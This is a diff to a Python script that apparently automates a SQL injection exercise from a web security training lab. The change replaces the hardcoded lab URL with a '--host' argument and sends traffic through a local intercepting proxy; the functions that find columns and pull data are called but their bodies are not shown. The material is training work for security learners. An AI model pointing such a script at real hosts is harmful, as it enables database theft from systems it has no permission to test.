@@ -5,6 +5,7 @@ import re
 import sys
 import bs4
 from requests.utils import requote_uri
+import argparse
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 target_url = "https://0acf00b704f13733c1de26d900060002.web-security-academy.net"
@@ -53,6 +54,18 @@ def sql_injection_get_data(payload):
         soup = bs4.BeautifulSoup(out.text, features="html.parser")
         print(out.text)
 
+if __name__ == "__main__":
+    
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--host', type=str, required=True)
+    args = parser.parse_args()
 
-payload = sql_injection_find_columns()
-sql_injection_get_data(payload)
+    r = requests.Session()
+    target_url = args.host
+    proxies = {
+        'https':'http://127.0.0.1:8080',
+        'http':'http://127.0.0.1:8080'
+    }
+
+    payload = sql_injection_find_columns()
+    sql_injection_get_data(payload)
